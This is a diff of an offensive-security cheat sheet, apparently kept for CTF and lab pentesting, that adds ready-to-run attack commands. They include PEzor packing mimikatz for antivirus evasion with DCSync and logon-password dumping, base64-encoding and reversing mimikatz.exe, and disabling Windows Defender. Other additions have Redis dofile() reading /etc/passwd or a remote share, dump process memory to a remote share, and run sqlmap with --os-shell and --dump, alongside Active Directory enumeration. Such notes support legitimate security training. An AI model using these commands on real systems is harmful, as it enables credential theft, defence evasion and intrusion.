@@ -212,7 +212,7 @@ $ snmpwalk -v1 -c public 10.10.10.10 2
 $ onesixtyone -c /path/to/seclists/Discovery/SNMP/snmp-onesixtyone.txt -i ip.txt
 ```
 
-### 636 (LDAP)
+### Port 636 (LDAP)
 
 ```bash
 => Nmap
@@ -224,6 +224,19 @@ $ ldapsearch -LLL -x -H ldap://10.10.10.10 -b '' -s base '(objectclass=*)'
 $ ldapsearch -x -h 10.10.10.10 -D 'BANK\nik' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local'
 $ ldapsearch -x -h 10.10.10.10 -D 'nik@bank.local' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local'
 $ ldapsearch -x -h 10.10.10.10 -D 'nik@bank.local' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local' | grep -i <user> -C 40
+
+=> Ldap Queries
+=> find domain computers not dc
+$ ([adsisearcher]"(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))").findall()
+
+=>  find domain controllers
+$ ([adsisearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))").findall()
+
+=> find all domain users
+$ ([adsisearcher]"(&(objectcategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))").findall()
+
+=> Get samaccountname
+$ ([adsisearcher]"(&(objectcategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))").findall().Properties.samaccountname
 
 ```
 
@@ -265,6 +278,9 @@ $ sqsh -U sa -P password -S 10.10.10.10
 	* EXEC master..xp_cmdshell 'whoami'
 	* go
 	
+=> Playground
+$ https://sqliteonline.com/
+
 => References
 $ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
 ```
@@ -334,7 +350,7 @@ $ nmap -p 3632 10.10.10.10 --script distcc-exec --script-args="distcc-exec.cmd='
 
 ```
 
-### 6379 (REDIS)
+### Port 6379 (REDIS)
 
 ```bash
 => Install
@@ -347,6 +363,8 @@ $ redis-cli -h 10.10.10.10
 	* info
 	* client list
 	* CONFIG GET *
+$ redis-cli -h 10.10.10.10 -p 6379 eval "dofile('//10.10.11.1//share')" 0
+$ redis-cli -h 10.10.10.10 -p 6379 eval "dofile('/etc/passwd')" 0
 
 => redis-dump-go
 $ https://github-com.translate.goog/yannh/redis-dump-go
@@ -1181,6 +1199,21 @@ Invoke-Bloodhound -CollectionMethod All -ZipFileName test.zip
 /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
 ```
 
+### PEzor
+
+```bash
+=> Download
+$ https://github.com/phra/PEzor
+
+=> Commands
+$ sudo bash install.sh
+$ ./PEzor.sh -format=exe mimikatz.exe -z 2 -p '"lsadump::dcsync /domain:spookysec.local /user:krbtgt" "exit"'
+$ ./PEzor.sh -format=exe mimikatz.exe -z 2 -p '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
+
+=> References
+$ 
+```
+
 ### jq
 
 ```code
@@ -1370,81 +1403,124 @@ $ https://www.acunetix.com/blog/articles/source-code-disclosure-dangerous/
 ### PowerShell Commands
 
 ```powershell
-# Show Process
-ps
-ps | findstr "something"
+=> Show Process
+$ ps
+$ ps | findstr "something"
 
-# Kill Process
-stop-process -id 500 -force
+=> Kill Process
+$ stop-process -id 500 -force
 
-# Wget
-wget 10.10.10.10/output.txt -outfile output.txt
+=> Wget
+$ wget 10.10.10.10/output.txt -outfile output.txt
 
-# Find file (recursive)
-Get-ChildItem -Path C:\ -Filter ntds.dit -Recurse -ErrorAction SilentlyContinue -Force
+=> Find file (recursive)
+$ Get-ChildItem -Path C:\ -Filter ntds.dit -Recurse -ErrorAction SilentlyContinue -Force
 
-# Search content recursively
-Get-ChildItem -Include "*.*" -recurse | Select-String -pattern "flag" | group path | select name
-Get-ChildItem -Include "*.*" -recurse | Select-String -pattern "password" | group path | select name
+=> Search content recursively
+$ Get-ChildItem -Include "*.*" -recurse | Select-String -pattern "flag" | group path | select name
+$ Get-ChildItem -Include "*.*" -recurse | Select-String -pattern "password" | group path | select name
 
-# Search Content
-(Get-ChildItem C:\Users).Count
+=> Search Content
+$ (Get-ChildItem C:\Users).Count
 
-# Disable Windows Defender
-Set-MpPreference -DisableRealtimeMonitoring $true
+=> Disable Windows Defender
+$ Set-MpPreference -DisableRealtimeMonitoring $true
 
-# Get Local/Remote Port
+=> Get Local/Remote Port
 ((Get-NetTCPConnection -State Listen | select -ExpandProperty LocalPort) -join [char]44) 
 ((Get-NetTCPConnection -State Established  | select -ExpandProperty RemotePort |Sort-Object -Unique) -join [char]44)
 
-# Get SMBShare
+=> Get SMBShare
 ((Get-SMBShare | select -ExpandProperty Name) -join [char]44)
 
-# Get IPV4 Address
+=> Get IPV4 Address
 (Get-NetIPAddress -AddressFamily IPv4).IPAddress
 
-# Read /etc/hosts (Remove # - Comments)
+=> Read /etc/hosts (Remove # - Comments)
 (Get-Content C:\Windows\System32\drivers\etc\hosts | Where { $_ -notmatch [char]94+[char]35 }).Trim()
 
-# List commandline process
+=> List commandline process
 wmic process list full | findstr /I commandline | Sort-Object -Unique
 wmic process list full | findstr /I commandline | Sort-Object -Unique | Select-String -Pattern "password"
 $test=[char]117+[char]114+[char]108;wmic process list full | findstr /I commandline |Sort-Object -Unique | Select-String -Pattern $test
 
-# Exclude String
+=> Exclude String
 type text.txt | Select-String -Pattern "food|eat" -NotMatch
 
-# List Firewall Settings
+=> Base64 (Encode)
+$Text = 'This is a secret and should be hidden'
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+$EncodedText
+
+=> Base64 (Encode - EXE)
+$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\Administrator\Documents\mimikatz.exe'));
+[IO.File]::WriteAllText('C:\Users\Administrator\Documents\encode.txt', $b64)
+
+=> Reverse
+$text2 = (cat 'C:\Windows\Tasks\output.txt')
+-join $text2[-1..-$text2.Length]
+@
+$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Windows\Tasks\mimikatz.exe'))
+$text = $b64.ToCharArray()
+[Array]::Reverse($text)
+-join $text
+
+=> Append File / Combine File
+$ [string]::join("",((cat  C:\Windows\Tasks\output.txt, C:\Windows\Tasks\output2.txt).Split("`n"))) > C:\Windows\Tasks\output3.txt
+
+=> List Firewall Settings
 netsh firewall show state
 
-# View lnk files information
+=> View lnk files information
 $sh = New-Object -COM WScript.Shell
 $targetPath = $sh.CreateShortcut('C:\Users\Public\Desktop\shortcut.lnk')
 $targetPath
 ```
 
+### Active Directory Enumeration
+
+```bash
+=> Find Group Membership
+$ (Get-WmiObject -Class Win32_GroupUser | where-object {$_.PartComponent -match "SQLAadmin"} | %{[wmi]$_.GroupComponent}).Caption
+
+=> Find Domain Controllers
+$ [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().DomainControllers.Name
+
+=> List Domain Computer
+$ Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select -ExpandProperty ds_cn
+$ (Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select -ExpandProperty ds_cn).Count
+
+=> References
+$ https://mlcsec.com/active-directory-domain-enumeration-part-2/
+$ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
+```
+
 ### Windows Commands
 
 ```bash
-# Commands
-cmdkey /list
+=> Commands
+$ cmdkey /list
 
-# taskkill
-taskkil /F /PID 8071
+=> taskkill
+$ taskkil /F /PID 8071
 
-# sc 
-sc qc servicename
-sc queryex servicename
-sc stop serviceanme
-sc start servicename
-sc query servicename
+=> sc 
+$ sc qc servicename
+$ sc queryex servicename
+$ sc stop serviceanme
+$ sc start servicename
+$ sc query servicename
 
-# Find File Recursive
-dir *flag* /s /b
+=> Find File Recursive
+$ dir *flag* /s /b
 
-# Dump process or pid
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [process ID of process.exe] dump.bin full
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [process ID of process.exe] \\10.10.10.10\public\dump.bin full
+=> winrs
+$ winrs.exe -r:WEB01APP hostname
+
+=> Dump process or pid
+$ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [process ID of process.exe] dump.bin full
+$ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [process ID of process.exe] \\10.10.10.10\public\dump.bin full
 
 ```
 
@@ -1788,29 +1864,28 @@ https://github.com/dirkjanm/krbrelayx
 ### Powerview.ps1
 
 ```code
-# Download
-git clone https://github.com/PowerShellMafia/PowerSploit.git
+=> Download
+$ git clone https://github.com/PowerShellMafia/PowerSploit.git
 
-# Commands
-Get-DomainComputer
-Get-DomainComputer -properties name
-Get-DomainComputer -Unconstrained -Properties useraccountcontrol,dnshostname | fl
-Get-DomainTrustMapping -Verbose
-Get-DomainTrust
-Get-NetForest
-Get-NetForestDomain
-Get-NetForestTrust
-(get-domaincomputer -domain bank.local).dnshostname
-Get-NetLoggedon
-Get-NetProcess
-Invoke-ShareFinder
-Invoke-UserHunter
+=> Commands
+$ Get-DomainComputer
+$ Get-DomainComputer -properties name
+$ Get-DomainComputer -Unconstrained -Properties useraccountcontrol,dnshostname | fl
+$ Get-DomainTrustMapping -Verbose
+$ Get-DomainTrust
+$ Get-NetForest
+$ Get-NetForestDomain
+$ Get-NetForestTrust
+$ (get-domaincomputer -domain bank.local).dnshostname
+$ Get-NetLoggedon
+$ Get-NetProcess
+$ Invoke-ShareFinder
+$ Invoke-UserHunter
 
-
-
-# References
-https://gist.github.com/macostag/44591910288d9cc8a1ed6ea35ac4f30f
-https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+=> References
+$ https://gist.github.com/macostag/44591910288d9cc8a1ed6ea35ac4f30f
+$ https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+$ https://www.slideshare.net/harmj0y/i-have-the-powerview
 ```
 
 ### Generate client SSL Certificate
@@ -2154,6 +2229,8 @@ $  https://github.com/GhostManager/Ghostwriter/blob/ee24eb299c0e66b6b718eb3ecf5f
 $ sqlmap -u "http://example.com/" --data "a=1&b=2&c=3" -p "a,b" --method POST
 $ sqlmap -u "http://example.com/?a=1&b=2&c=3" -p "a,b"
 $ sqlmap -r post.req --level=5 --risk=3 --os-shell
+$ sqlmap -r item.req --proxy http://127.0.0.1:8080 --level 4 --risk 3 -p parameters --technique=S --dbms=mssql --batch --random-agent --force-ssl -D databases -T tables -C columns --dump --flush
+$ sqlmap -r item.req --proxy http://127.0.0.1:8080 --level 4 --risk 3 -p parameters --technique=S --dbms=mssql --batch --random-agent --force-ssl --sql-query="select len(coumns) from tables;"
 ```
 
 ### Nim
